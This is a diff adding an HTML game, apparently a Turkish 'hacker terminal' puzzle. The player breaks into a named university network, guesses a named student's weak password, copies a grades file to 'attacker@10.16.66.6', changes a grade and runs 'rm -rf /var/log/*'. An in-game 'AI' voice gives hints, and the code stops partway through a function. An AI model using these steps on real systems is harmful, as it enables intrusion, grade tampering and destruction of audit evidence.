@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Görev Terminali</title>
+  <style>
+    :root {
+      --primary-color: #00FF00;
+      --secondary-color: #00CC00;
+      --background-color: #000000;
+      --text-color: #00FF00;
+      --error-color: #FF0000;
+      --success-color: #00FF00;
+      --warning-color: #FFFF00;
+    }
+
+    body {
+      margin: 0;
+      background: var(--background-color);
+      color: var(--text-color);
+      font-family: 'Fira Code', 'Courier New', monospace;
+      font-size: 1em;
+      line-height: 1.6;
+    }
+
+    #terminal {
+      margin-top: 20px;
+      padding: 20px;
+      height: calc(85vh - 20px);
+      overflow-y: auto;
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.9);
+      border: 1px solid var(--primary-color);
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+      position: relative;
+      z-index: 1;
+      margin-right: 260px;
+    }
+
+    #terminal::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+      animation: scan 2s linear infinite;
+    }
+
+    @keyframes scan {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    #command {
+      width: calc(100% - 260px);
+      padding: 10px;
+      border: none;
+      background: var(--background-color);
+      color: var(--text-color);
+      font-family: 'Fira Code', monospace;
+      font-size: 1em;
+      border-top: 1px solid var(--primary-color);
+      outline: none;
+      transition: all 0.3s ease;
+      margin-right: 260px;
+    }
+
+    #command:focus {
+      box-shadow: 0 0 10px var(--primary-color);
+    }
+
+    #timer {
+      position: fixed;
+      top: 10px;
+      right: 20px;
+      background-color: rgba(0, 0, 0, 0.8);
+      border: 1px solid var(--primary-color);
+      padding: 4px 14px;
+      font-family: 'Fira Code', monospace;
+      font-size: 1.6em;
+      z-index: 9999;
+      transition: all 0.3s ease;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+      width: 200px;
+      text-align: center;
+    }
+
+    #lives {
+      position: fixed;
+      top: 60px;
+      right: 20px;
+      color: var(--primary-color);
+      background-color: rgba(0, 0, 0, 0.8);
+      border: 1px solid var(--primary-color);
+      padding: 4px 14px;
+      font-family: 'Fira Code', monospace;
+      font-size: 1.1em;
+      z-index: 9999;
+      transition: all 0.3s ease;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+      transform: translateZ(0);
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 7px;
+      width: 200px;
+    }
+
+    .data-text {
+      font-size: 0.9em;
+      color: var(--primary-color);
+      width: 100%;
+      text-align: center;
+    }
+
+    .data-boxes {
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+      width: 100%;
+    }
+
+    .data-box {
+      width: 24px;
+      height: 24px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding-right: 8px;
+    }
+
+    .data-box::before {
+      content: '';
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: "Font Awesome 6 Brands", "Font Awesome 6 Free";
+      font-weight: 900;
+      font-size: 18px;
+      color: var(--primary-color);
+    }
+
+    .data-box[data-type="WhatsApp"]::before {
+      content: "\f232";
+      font-family: "Font Awesome 6 Brands";
+    }
+
+    .data-box[data-type="Instagram"]::before {
+      content: "\f16d";
+      font-family: "Font Awesome 6 Brands";
+    }
+
+    .data-box[data-type="Galeri"]::before {
+      content: "\f03e";
+      font-family: "Font Awesome 6 Free";
+    }
+
+    .data-box[data-type="Rehber"]::before {
+      content: "\f007";
+      font-family: "Font Awesome 6 Free";
+    }
+
+    .data-box[data-type="Banka"]::before {
+      content: "\f19c";
+      font-family: "Font Awesome 6 Free";
+    }
+
+    .data-box.lost::before {
+      opacity: 0.3;
+    }
+
+    .data-box.lost::after {
+      color: var(--error-color);
+    }
+
+    .data-box::after {
+      content: attr(data-type);
+      position: static;
+      font-size: 0.8em;
+      color: var(--primary-color);
+      margin-left: 35px;
+      white-space: nowrap;
+    }
+
+    .progress-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 5px;
+      background: var(--primary-color);
+      z-index: 9998;
+      transition: width 1s linear, background 0.3s ease;
+      box-shadow: 0 0 10px var(--primary-color);
+    }
+
+    .bluescreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #0000AA;
+      color: white;
+      font-family: 'Fira Code', monospace;
+      z-index: 10000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      text-align: center;
+      animation: flicker 0.5s infinite;
+    }
+
+    .bluescreen-content {
+      max-width: 600px;
+    }
+
+    .bluescreen-header {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #FFFFFF;
+    }
+
+    .bluescreen-body {
+      font-size: 18px;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .bluescreen-progress {
+      width: 100%;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.2);
+      margin: 20px 0;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+
+    .bluescreen-progress-bar {
+      width: 0%;
+      height: 100%;
+      background: white;
+      transition: width 0.1s linear;
+    }
+
+    .bluescreen-footer {
+      font-size: 16px;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    @keyframes flicker {
+      0% { opacity: 1; }
+      50% { opacity: 0.8; }
+      100% { opacity: 1; }
+    }
+
+    #explosion {
+      position: fixed;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: var(--error-color);
+      font-size: 2em;
+      font-family: 'Fira Code', monospace;
+      z-index: 9999;
+      animation: shake 0.5s infinite;
+      display: none;
+      text-shadow: 0 0 10px var(--error-color);
+    }
+
+    @keyframes shake {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      25% { transform: translate(-50%, -50%) rotate(-3deg); }
+      50% { transform: translate(-50%, -50%) rotate(3deg); }
+      75% { transform: translate(-50%, -50%) rotate(-3deg); }
+      100% { transform: translate(-50%, -50%) rotate(0deg); }
+    }
+
+    .command-history {
+      position: fixed;
+      bottom: 60px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.8);
+      border: 1px solid var(--primary-color);
+      padding: 10px;
+      max-height: 200px;
+      overflow-y: auto;
+      display: none;
+    }
+
+    .command-history.active {
+      display: block;
+    }
+
+    .success-message {
+      color: var(--success-color);
+      animation: fadeIn 0.5s ease;
+    }
+
+    .error-message {
+      color: var(--error-color);
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .tooltip {
+      position: absolute;
+      background: rgba(0, 0, 0, 0.9);
+      border: 1px solid var(--primary-color);
+      padding: 5px 10px;
+      border-radius: 4px;
+      font-size: 0.9em;
+      pointer-events: none;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .tooltip.visible {
+      opacity: 1;
+    }
+
+    .matrix-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+      background: linear-gradient(
+        rgba(0, 255, 0, 0.03) 50%,
+        transparent 50%
+      );
+      background-size: 100% 4px;
+      animation: matrix 0.5s linear infinite;
+    }
+
+    .scanline {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 2;
+      background: linear-gradient(
+        to bottom,
+        transparent 50%,
+        rgba(0, 255, 0, 0.02) 50%
+      );
+      background-size: 100% 4px;
+      animation: scan 8s linear infinite;
+    }
+
+    @keyframes matrix {
+      0% { background-position: 0 0; }
+      100% { background-position: 0 4px; }
+    }
+
+    @keyframes scan {
+      0% { background-position: 0 0; }
+      100% { background-position: 0 100%; }
+    }
+
+    .terminal-text {
+      position: relative;
+      display: inline-block;
+      text-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
+    }
+
+    .terminal-text.active::after {
+      content: '|';
+      position: absolute;
+      right: -2px;
+      animation: blink 1s step-end infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    .success-text {
+      color: var(--success-color);
+      text-shadow: 0 0 5px var(--success-color);
+    }
+
+    .error-text {
+      color: var(--error-color);
+      text-shadow: 0 0 5px var(--error-color);
+    }
+
+    .warning-text {
+      color: var(--warning-color);
+      text-shadow: 0 0 5px var(--warning-color);
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    #lives.warning {
+      animation: pulse 0.5s infinite;
+    }
+
+    .task-status {
+      position: fixed;
+      bottom: 80px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.8);
+      border: 1px solid var(--primary-color);
+      padding: 8px 14px;
+      font-family: 'Fira Code', monospace;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+      width: 200px;
+      z-index: 9999;
+    }
+
+    .task-progress {
+      margin-bottom: 5px;
+    }
+
+    .progress-text {
+      font-size: 0.9em;
+      margin-bottom: 5px;
+      color: var(--primary-color);
+    }
+
+    .progress-bar-container {
+      width: 100%;
+      height: 4px;
+      background: rgba(0, 255, 0, 0.2);
+      border-radius: 2px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: var(--primary-color);
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+
+    .current-task {
+      font-size: 0.9em;
+      color: var(--primary-color);
+      text-align: center;
+    }
+
+    .task-header {
+      font-size: 1.2em;
+      font-weight: bold;
+      color: var(--primary-color);
+      margin-bottom: 10px;
+      text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
+    }
+
+    .task-content {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 15px;
+      border-radius: 4px;
+      border: 1px solid rgba(0, 255, 0, 0.3);
+      margin: 10px 0;
+    }
+
+    .warning-message {
+      color: var(--warning-color);
+      background: rgba(255, 255, 0, 0.1);
+      padding: 10px;
+      border: 1px solid var(--warning-color);
+      border-radius: 4px;
+      margin: 10px 0;
+      width: 100%;
+    }
+
+    .task-container {
+      margin-bottom: 20px;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid var(--primary-color);
+      border-radius: 4px;
+      width: 100%;
+    }
+
+    .error-message {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(255, 0, 0, 0.1);
+      color: var(--error-color);
+      padding: 10px;
+      border: 1px solid var(--error-color);
+      border-radius: 4px;
+      font-family: 'Fira Code', monospace;
+      z-index: 9999;
+      width: 200px;
+      text-align: center;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .last-life-warning {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 0, 0, 0.9);
+      color: white;
+      padding: 20px 40px;
+      border: 2px solid #ff0000;
+      border-radius: 8px;
+      font-size: 24px;
+      font-weight: bold;
+      text-align: center;
+      z-index: 9999;
+      animation: pulseWarning 0.5s infinite, fadeInOut 3s forwards;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+    }
+
+    @keyframes pulseWarning {
+      0% { transform: translate(-50%, -50%) scale(1); }
+      50% { transform: translate(-50%, -50%) scale(1.1); }
+      100% { transform: translate(-50%, -50%) scale(1); }
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; }
+      20% { opacity: 1; }
+      80% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+
+    .hacked-profs {
+      position: fixed;
+      bottom: 170px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.8);
+      border: 1px solid var(--primary-color);
+      padding: 8px 14px;
+      font-family: 'Fira Code', monospace;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+      width: 200px;
+      z-index: 9999;
+    }
+
+    .hacked-header {
+      color: var(--primary-color);
+      font-size: 1.1em;
+      text-align: center;
+      margin-bottom: 10px;
+      text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
+    }
+
+    .hacked-list {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+
+    .hacked-item {
+      color: var(--success-color);
+      font-size: 0.9em;
+      padding: 5px;
+      border: 1px solid rgba(0, 255, 0, 0.3);
+      border-radius: 3px;
+      text-align: center;
+      background: rgba(0, 255, 0, 0.1);
+      transition: all 0.3s ease;
+    }
+
+    .hacked-item:hover {
+      background: rgba(0, 255, 0, 0.2);
+      transform: translateX(5px);
+    }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+<div class="status-container">
+  <div class="status-item" id="timer">10:00</div>
+  <div class="status-item" id="lives">
+    <span class="data-text">Veriler Sızıyor:</span>
+    <div class="data-boxes">
+      <div class="data-box" data-type="WhatsApp"></div>
+      <div class="data-box" data-type="Instagram"></div>
+      <div class="data-box" data-type="Galeri"></div>
+      <div class="data-box" data-type="Rehber"></div>
+      <div class="data-box" data-type="Banka"></div>
+    </div>
+  </div>
+</div>
+
+<div class="task-status">
+  <div class="task-progress">
+    <div class="progress-text">Görev İlerlemesi</div>
+    <div class="progress-bar-container">
+      <div class="progress-bar-fill"></div>
+    </div>
+  </div>
+  <div class="current-task">Görev 1/5</div>
+</div>
+
+<div class="hacked-profs">
+  <div class="hacked-header">Hedef Kurbanlar</div>
+  <div class="hacked-list">
+    <div class="hacked-item">A. Şenel</div>
+    <div class="hacked-item">S. Baydınar</div>
+    <div class="hacked-item">H. Boran</div>
+    <div class="hacked-item">E. Şafak</div>
+  </div>
+</div>
+
+<div class="progress-bar" id="progress"></div>
+<div id="explosion">💥 PATLAMA! Süre dolmak üzere!</div>
+<div id="terminal"></div>
+<div class="matrix-overlay"></div>
+<div class="scanline"></div>
+<div class="command-history" id="commandHistory"></div>
+<div class="command-hints" id="commandHints"></div>
+<input type="text" id="command" placeholder="komut girin... (ipucu için: ipucu)" autofocus>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const terminal = document.getElementById("terminal");
+  const input = document.getElementById("command");
+  const livesEl = document.getElementById("lives");
+  const timerEl = document.getElementById("timer");
+  const progressBar = document.getElementById("progress");
+  const explosion = document.getElementById("explosion");
+  const commandHistory = document.getElementById("commandHistory");
+
+  let görevIndex = 0;
+  let can = 5;
+  let kalanSaniye = 10 * 60;
+  let hızKatı = 1;
+  let commandHistoryIndex = -1;
+  let commandHistoryList = [];
+  let score = 0;
+
+  // Ses efektleri
+  const sounds = {
+    success: new Audio('success.mp3'),
+    error: new Audio('error.mp3'),
+    warning: new Audio('warning.mp3'),
+    type: new Audio('type.mp3')
+  };
+
+  const ogreticiNotlar = [
+    "💡 DHCP komutu: 'dhcp-discover' ile başlar ve '--interface eth0' parametresi ile devam eder. Bu komut ağdaki DHCP sunucusundan IP adresi ister.",
+    "💡 Kullanıcı adı genellikle ad.soyad formatındadır. Zayıf şifreler genelde basit sayı dizileridir (örn: 123456).",
+    "💡 find komutu ile dosya aramak için: 'find [dizin] -name [dosya_adı]' formatını kullan. Örnek: find /home/kullanici -name 'dosya.txt'",
+    "💡 Dosya transferi için 'scp' komutu kullanılır. Dosya değiştirmek için 'sed' komutu kullanılır. Örnek: scp dosya.txt kullanici@sunucu:/hedef && sed -i 's/eski/yeni/g' dosya.txt",
+    "💡 Log dosyalarını silmek için 'rm -rf' komutu kullanılır. Tüm loglar genelde /var/log/ dizininde bulunur."
+  ];
+
+  const görevler = [
+    {
+      soru: ">> GÖREV #1: DÜZCE ÜNİVERSİTESİ yerel ağına sızmak için doğru DHCP komutunu gir.\n>> Komut: ________ --interface ______",
+      cevap: "dhcp-discover --interface eth0",
+      yanıt: "IP adresi alındı: 10.16.23.48  [✔]"
+    },
+    {
+      soru: ">> GÖREV #2: Yerel ağda Tunahan Timuçin'in cihazını tespit et. Doğru kullanıcı adı ve parola kombinasyonunu bul:",
+      cevap: "t.timucin 123456",
+      yanıt: "Erişim sağlandı. [✔]"
+    },
+    {
+      soru: ">> GÖREV #3: Vize notlarını içeren .txt dosyasını bul. Komutu gir:",
+      cevap: "find /home/t.timucin -name \"vize_notlari.txt\"",
+      yanıt: "Dosya bulundu: /home/t.timucin/Desktop/vize_notlari.txt  [✔]"
+    },
+    {
+      soru: ">> GÖREV #4: Dosyayı transfer et ve notu değiştir. Komutu gir:",
+      cevap: "scp vize_notlari.txt attacker@10.16.66.6:/hacked && sed -i 's/48/88/g' vize_notlari.txt",
+      yanıt: "Dosya transfer edildi ve değiştirildi. [✔]"
+    },
+    {
+      soru: ">> GÖREV #5: Tüm logları temizle. Komutu gir:",
+      cevap: "rm -rf /var/log/*",
+      yanıt: "Loglar temizlendi. [✔]\n\nTüm görevler başarıyla tamamlandı. Ağdan güvenli şekilde çıkılıyor..."
+    }
+  ];
+
+  const extraKomutlar = {
+    "yardım": "Kullanılabilir komutlar:\n- ipucu: Mevcut görev için ipucu al (1 can kaybı)\n- yardım: Bu mesajı göster\n- çık: Sistemden çıkış yap",
+    "çık": "Çıkış isteğin kaydedildi. Ama henüz serbest değilsin.",
+    "görevi tekrar et": () => görevler[görevIndex]?.soru || "Tüm görevler bitti.",
+    "hack nedir": "Bu bir tanım değil, bir eylem. Şu anda yaşıyorsun.",
+    "ipucu": () => {
+      can--;
+      güncelleCan();
+      return `📌 İpucu: ${ogreticiNotlar[görevIndex]}\n⚠️ Not: İpucu almak için 1 can kaybettin. Kalan can: ${can}`;
+    }
+  };
+
+  // Komut ipuçları
+  const commandHints = {
+    'dhcp-discover': 'Ağ arayüzü üzerinden DHCP keşfi başlatır',
+    'find': 'Dosya arama komutu',
+    'scp': 'Güvenli dosya kopyalama',
+    'sed': 'Metin düzenleme aracı',
+    'rm': 'Dosya silme komutu',
+    'ipucu': 'Mevcut görev için ipucu al',
+    'yardım': 'Komut listesini göster',
+    'çık': 'Sistemden çıkış yap'
+  };
+
+  // Komut geçmişi yönetimi
+  function addToHistory(command) {
+    if (command && command !== commandHistoryList[0]) {
+      commandHistoryList.unshift(command);
+      if (commandHistoryList.length > 10) {
+        commandHistoryList.pop();
+      }
+      updateCommandHistory();
+    }
+  }
+
+  function updateCommandHistory() {
+    const historyEl = document.getElementById('commandHistory');
+    historyEl.innerHTML = commandHistoryList
+      .map(cmd => `<div class="history-item">${cmd}</div>`)
+      .join('');
+  }
+
+  // Komut otomatik tamamlama
+  function getCommandSuggestions(input) {
+    const suggestions = [
+      'dhcp-discover',
+      'find',
+      'scp',
+      'sed',
+      'rm',
+      'ipucu',
+      'yardım',
+      'çık'
+    ];
+    return suggestions.filter(cmd => cmd.startsWith(input.toLowerCase()));
+  }
+
+  // Puan sistemi
+  function updateScore(points) {
+    score += points;
+    const scoreEl = document.getElementById('score');
+    if (scoreEl) {
+      scoreEl.textContent = `Puan: ${score}`;
+    }
+  }
+
+  // Animasyonlu mesaj gösterimi
+  function showAnimatedMessage(message, type = 'info') {
+    const messageEl = document.createElement('div');
+    messageEl.className = `message ${type}-message`;
+    messageEl.textContent = message;
+    terminal.appendChild(messageEl);
+    terminal.scrollTop = terminal.scrollHeight;
+    
+    setTimeout(() => {
+      messageEl.style.opacity = '0';
+      setTimeout(() => messageEl.remove(), 500);
+    }, 3000);
+  }
+
+  // Tooltip gösterimi
+  function showTooltip(element, text) {
+    const tooltip = document.createElement('div');
+    tooltip.className = 'tooltip';
+    tooltip.textContent = text;
+    document.body.appendChild(tooltip);
+
+    const rect = element.getBoundingClientRect();
+    tooltip.style.top = `${rect.bottom + 5}px`;
+    tooltip.style.left = `${rect.left}px`;
+    tooltip.classList.add('visible');
+
+    setTimeout(() => {
+      tooltip.classList.remove('visible');
+      setTimeout(() => tooltip.remove(), 300);
+    }, 2000);
+  }
+
+  function güncelleCan() {
+    const dataText = document.createElement('span');
+    dataText.className = 'data-text';
+    dataText.textContent = 'Veriler Sızıyor:';
+    
+    const dataBoxes = document.createElement('div');
+    dataBoxes.className = 'data-boxes';
+    
+    const veriTipleri = ['WhatsApp', 'Instagram', 'Galeri', 'Rehber', 'Banka'];
+    
+    for (let i = 0; i < 5; i++) {
+      const box = document.createElement('div');
+      box.className = 'data-box';
+      if (i >= can) {
+        box.classList.add('lost');
+        box.setAttribute('data-type', veriTipleri[i] + ' sızdırıldı');
+      } else {
+        box.setAttribute('data-type', veriTipleri[i]);
+      }
+      dataBoxes.appendChild(box);
+    }
+    
+    livesEl.innerHTML = '';
+    livesEl.appendChild(dataText);
+    livesEl.appendChild(dataBoxes);
+
+    if (can <= 2) {
+      livesEl.style.color = "red";
+      livesEl.classList.add('warning');
+    } else {
+      livesEl.style.color = "#00FF00";
+      livesEl.classList.remove('warning');
+    }
+    if (can === 1) {
+      const warningDiv = document.createElement('div');
+      warningDiv.className = 'last-life-warning';
+      warningDiv.innerHTML = '⚠️ SON VERİ!<br>DİKKATLİ OL!';
+      document.body.appendChild(warningDiv);
+      
+      setTimeout(() => {
+        warningDiv.remove();
+      }, 3000);
+    }
+  }
+
+  function maviEkran() {
+    const bluescreen = document.createElement('div');
+    bluescreen.className = 'bluescreen';
+    bluescreen.innerHTML = `
+      <div class="bluescreen-content">
+        <div class="bluescreen-header">*** STOP: 0x000000D3 (SYSTEM_FAILURE)</div>
+        <div class="bluescreen-body">
+          <p>Görev başarısız. Tüm canlar tükendi.</p>
+          <p>Sistem kapatılıyor...</p>
+          <div class="bluescreen-progress">
+            <div class="bluescreen-progress-bar"></div>
+          </div>
+          <p class="bluescreen-footer">Press any key to terminate.</p>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(bluescreen);
+
+    // Mavi ekran animasyonu
+    const progressBar = bluescreen.querySelector('.bluescreen-progress-bar');
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += 1;
+      progressBar.style.width = `${progress}%`;
+      if (progress >= 100) {
+        clearInterval(interval);
+        setTimeout(() => {
+          document.body.style.backgroundColor = '#0000AA';
+          bluescreen.style.opacity = '0';
+          setTimeout(() => {
+            document.body.innerHTML = '<div class="bluescreen">Sistem yeniden başlatılıyor...</div>';
+            setTimeout(() => {
+              window.location.reload();
+            }, 2000);
+          }, 1000);
+        }, 1000);
+      }
+    }, 50);
+  }
+
+  // Terminal metin animasyonu için yardımcı fonksiyon
+  function typeText(element, text, speed = 50) {
+    let i = 0;
+    element.innerHTML = '';
+    const span = document.createElement('span');
+    span.className = 'terminal-text';
+    element.appendChild(span);
+
+    function type() {
+      if (i < text.length) {
+        span.textContent += text.charAt(i);
+        i++;
+        setTimeout(type, speed);
+      } else {
+        // Yazma tamamlandığında imleci kaldır
+        span.classList.remove('active');
+      }
+    }
+    // Yazma başladığında imleci göster
+    span.classList.add('active');
+    type();
+  }
+
+  // Mevcut terminal.innerHTML atamalarını güncelle
+  function updateTerminal(text, type = 'normal') {
+    const div = document.createElement('div');
+    div.className = `terminal-text ${type}-text`;
+    
+    if (text.includes('GÖREV #')) {
+      const parts = text.split('\n');
+      const header = parts[0];
+      const content = parts.slice(1).join('\n');
+      
+      div.innerHTML = `
+        <div class="task-container">
+          <div class="task-header">${header}</div>
+          <div class="task-content">${content}</div>
+        </div>
+      `;
+      terminal.appendChild(div);
+    } else if (type === 'warning') {
+      div.innerHTML = `<div class="warning-message">${text}</div>`;
+      terminal.appendChild(div);
+    } else {
+      div.textContent = text;
+      terminal.appendChild(div);
+      typeText(div, text);
+    }
+    
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  // Başlangıç mesajını güncelle
+  terminal.innerHTML = '';
+  const startDiv = document.createElement('div');
+  startDiv.innerHTML = '>> DİKKAT! Verileriniz sızmaya başladı!<br>Her yanlış komutta bir veri sızdırılacak.';
+  startDiv.className = 'warning-text';
+  terminal.appendChild(startDiv);
+
+  const taskDiv = document.createElement('div');
+  taskDiv.innerHTML = görevler[görevIndex].soru;
+  taskDiv.className = 'task-container';
+  terminal.appendChild(taskDiv);
+
+  // Yapay zeka cevapları
+  const aiCevaplar = {
+    dhcp: [
+      "AI >> DHCP komutunda '--interface' parametresi eksik. Örnek: dhcp-discover --interface eth0",
+      "AI >> Ağ arayüzünü belirtmeyi unuttunuz. '--interface eth0' eklemelisiniz.",
+      "AI >> DHCP keşfi için doğru format: dhcp-discover --interface [arayüz_adı]",
+      "AI >> Ağ arayüzü olmadan DHCP keşfi yapamazsınız. '--interface' parametresini ekleyin."
+    ],
+    kullanici: [
+      "AI >> Kullanıcı adı 't.timucin' formatında olmalı. Şifre genelde basit sayılardan oluşur.",
+      "AI >> Ad.soyad formatını kullanın. Şifre için yaygın sayı dizilerini deneyin.",
+      "AI >> Kullanıcı adı: t.timucin, şifre için 123456 gibi basit kombinasyonları deneyin.",
+      "AI >> Kullanıcı adı ve şifre kombinasyonunu doğru formatta girin: kullanici sifre"
+    ],
+    find: [
+      "AI >> Dosya aramak için 'find' komutunu kullanın. Dizin ve dosya adını belirtmeyi unutmayın.",
+      "AI >> find komutu formatı: find [dizin] -name [dosya_adı]",
+      "AI >> Dosya aramak için doğru format: find /home/kullanici -name 'dosya.txt'",
+      "AI >> '-name' parametresi olmadan dosya arayamazsınız. Doğru formatı kullanın."
+    ],
+    scp: [
+      "AI >> Dosya transferi için 'scp' komutunu kullanın. Hedef sunucu bilgisini eklemeyi unutmayın.",
+      "AI >> SCP formatı: scp [dosya] [kullanici]@[sunucu]:[hedef_dizin]",
+      "AI >> Hedef sunucu bilgisi eksik. '@' işareti ve sunucu adresini ekleyin.",
+      "AI >> Dosya transferi için doğru format: scp dosya.txt kullanici@sunucu:/hedef"
+    ],
+    sed: [
+      "AI >> sed komutunda '-i' parametresi eksik. Bu parametre dosyayı doğrudan değiştirmek için gerekli.",
+      "AI >> Dosya değiştirmek için: sed -i 's/eski/yeni/g' dosya.txt",
+      "AI >> '-i' parametresi olmadan dosyayı değiştiremezsiniz. Doğru formatı kullanın.",
+      "AI >> Sed komutu formatı: sed -i 's/[eski_metin]/[yeni_metin]/g' [dosya]"
+    ],
+    rm: [
+      "AI >> Log dosyalarını silmek için 'rm -rf' komutunu kullanın. Tüm loglar /var/log/ dizininde.",
+      "AI >> Log temizleme komutu: rm -rf /var/log/*",
+      "AI >> Tüm logları silmek için doğru dizini belirtin: /var/log/",
+      "AI >> '-rf' parametreleri olmadan dizin silemezsiniz. Doğru formatı kullanın."
+    ],
+    genel: [
+      "AI >> Yanlış komut. İpucu: " + ogreticiNotlar[görevIndex],
+      "AI >> Bu görev için doğru komutu kullanın. İpucu: " + ogreticiNotlar[görevIndex],
+      "AI >> Komut formatını kontrol edin. İpucu: " + ogreticiNotlar[görevIndex],
+      "AI >> Tekrar deneyin. İpucu: " + ogreticiNotlar[görevIndex]
+    ]
+  };
+
+  // Son kullanılan cevapları takip etmek için
+  const sonKullanilanCevaplar = {};
+
+  // Rastgele cevap seçme fonksiyonu (tekrar etmeyecek şekilde)
+  function rastgeleCevap(dizi, tip) {
+    if (!sonKullanilanCevaplar[tip]) {
+      sonKullanilanCevaplar[tip] = [];
+    }
+
+    if (sonKullanilanCevaplar[tip].length >= dizi.length) {
+      sonKullanilanCevaplar[tip] = [];
+    }
+
+    const kullanilabilirCevaplar = dizi.filter(cevap => 
+      !sonKullanilanCevaplar[tip].includes(cevap)
+    );
+
+    const secilenCevap = kullanilabilirCevaplar[
+      Math.floor(Math.random() * kullanilabilirCevaplar.length)
+    ];
+
+    sonKullanilanCevaplar[tip].push(secilenCevap);
+    return secilenCevap;
+  }
+
+  // Yapay zeka yardımcı fonksiyonu
+  function aiYardimci(komut) {
+    const komutTipleri = {
+      'dhcp': 'dhcp',
+      't.timucin': 'kullanici',
+      'find': 'find',
+      'scp': 'scp',
+      'sed': 'sed',
+      'rm': 'rm'
+    };
+
+    // Komut tipini belirle
+    let tip = 'genel';
+    for (const [anahtar, deger] of Object.entries(komutTipleri)) {
+      if (komut.includes(anahtar)) {
+        tip = deger;
+        break;
+      }
+    }
+
+    // Görev bazlı özel durumlar
+    if (tip === 'genel') {
+      const görevTipleri = ['dhcp', 'kullanici', 'find', 'scp', 'rm'];
+      tip = görevTipleri[görevIndex] || 'genel';
+    }
+
+    return rastgeleCevap(aiCevaplar[tip], tip);
+  }
+
+  input.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      const komut = input.value.trim().toLowerCase().replace(/[üu]/g, 'u').replace(/[ıi]/g, 'i');
+      
+      // Komut girişini komut satırının altına ekle
+      const commandDiv = document.createElement('div');
+      commandDiv.innerHTML = `> ${komut}`;
+      commandDiv.className = 'terminal-text normal-text';
+      commandDiv.style.marginLeft = '20px';
+      terminal.appendChild(commandDiv);
+      
+      input.value = "";
+
+      const aktifGörev = görevler[görevIndex];
+
+      if (aktifGörev && komut === aktifGörev.cevap.toLowerCase()) {
+        const successDiv = document.createElement('div');
+        successDiv.innerHTML = aktifGörev.yanıt;
+        successDiv.className = 'success-text';
+        terminal.appendChild(successDiv);
+
+        const learnDiv = document.createElement('div');
+        learnDiv.innerHTML = `📘 Öğren: ${ogreticiNotlar[görevIndex]}`;
+        learnDiv.className = 'warning-text';
+        terminal.appendChild(learnDiv);
+
+        görevIndex++;
+        
+        if (görevIndex < görevler.length) {
+          const nextTaskDiv = document.createElement('div');
+          nextTaskDiv.innerHTML = görevler[görevIndex].soru;
